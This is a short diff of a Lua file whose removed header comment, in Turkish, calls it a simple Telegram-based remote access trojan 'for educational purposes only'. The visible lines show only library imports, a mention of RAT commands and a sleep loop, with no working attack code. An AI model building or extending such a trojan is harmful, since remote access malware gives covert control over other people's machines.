@@ -1,4 +1,3 @@
--- Basit Lua Telegram RAT (Sadece eğitim amaçlı)
 local https = require("ssl.https")
 local ltn12 = require("ltn12")
 local json = require("dkjson")
@@ -215,3 +214,4 @@ Lua RAT Komutları:
     
     socket.sleep(1) -- 1 saniye bekle
 end
+
